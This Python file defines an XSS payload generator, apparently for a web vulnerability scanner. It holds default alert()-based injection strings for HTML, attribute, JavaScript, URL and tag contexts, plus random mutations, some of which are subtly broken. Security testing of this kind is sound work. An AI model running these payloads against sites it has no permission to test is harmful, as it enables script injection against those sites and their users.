import os
import random
import numpy as np
from pathlib import Path

class PayloadGenerator:
    def __init__(self, payloads_file=None):
        self.payloads = {}
        self.load_payloads(payloads_file)
    
    def load_payloads(self, payloads_file=None):
        """Load XSS payloads from file or use default ones"""
        if payloads_file and os.path.exists(payloads_file):
            self._load_from_file(payloads_file)
        else:
            self._load_defaults()
    
    def _load_from_file(self, file_path):
        """Load payloads from a file"""
        payloads = []
        current_context = "html"
        
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                if line.startswith('[') and line.endswith(']'):
                    # This is a context marker
                    current_context = line[1:-1].lower()
                    if current_context not in self.payloads:
                        self.payloads[current_context] = []
                else:
                    if current_context not in self.payloads:
                        self.payloads[current_context] = []
                    self.payloads[current_context].append(line)
    
    def _load_defaults(self):
        """Load default XSS payloads by context"""
        self.payloads = {
            "html": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src='javascript:alert(`XSS`)'>",
            ],
            "attribute": [
                "\" onmouseover=\"alert('XSS')\"",
                "\" onfocus=\"alert('XSS')\"",
                "\" onclick=\"alert('XSS')\"",
                "\" onerror=\"alert('XSS')\"",
                "' onmouseover='alert(\"XSS\")'",
            ],
            "js": [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "\\';alert('XSS');//",
                "alert('XSS')",
                "alert`XSS`",
            ],
            "url": [
                "javascript:alert('XSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
                "data:text/html,<script>alert('XSS')</script>",
            ],
            "tag": [
                "><script>alert('XSS')</script>",
                "><img src=x onerror=alert('XSS')>",
                "><svg/onload=alert('XSS')>",
            ]
        }
    
    def generate(self, context="html", count=5, mutation_rate=0.2):
        """
        Generate XSS payloads for a specific context
        Optionally apply mutations to create variations
        """
        if context not in self.payloads or not self.payloads[context]:
            # Fallback to HTML context if requested context is not available
            context = "html"
        
        # Get base payloads for the context
        available_payloads = self.payloads[context]
        
        # For now, just randomly select from available payloads
        selected = []
        for _ in range(min(count, len(available_payloads))):
            payload = random.choice(available_payloads)
            if mutation_rate > 0 and random.random() < mutation_rate:
                payload = self._mutate_payload(payload)
            selected.append(payload)
        
        return selected
    
    def _mutate_payload(self, payload):
        """Apply simple mutations to a payload to create variations"""
        mutations = [
            # Case variations
            lambda p: p.replace('alert', 'ALERT'),
            # Whitespace variations
            lambda p: p.replace(' ', ' '*random.randint(1, 3)),
            # Encoding variations (simple hex)
            lambda p: p.replace('XSS', '\\x58\\x53\\x53'),
            # Quotes variations
            lambda p: p.replace("'", "\"").replace("\"", "'"),
            # Function variations
            lambda p: p.replace('alert', 'confirm'),
        ]
        
        # Apply 1-2 random mutations
        for _ in range(random.randint(1, 2)):
            mutation = random.choice(mutations)
            payload = mutation(payload)
        
        return payload
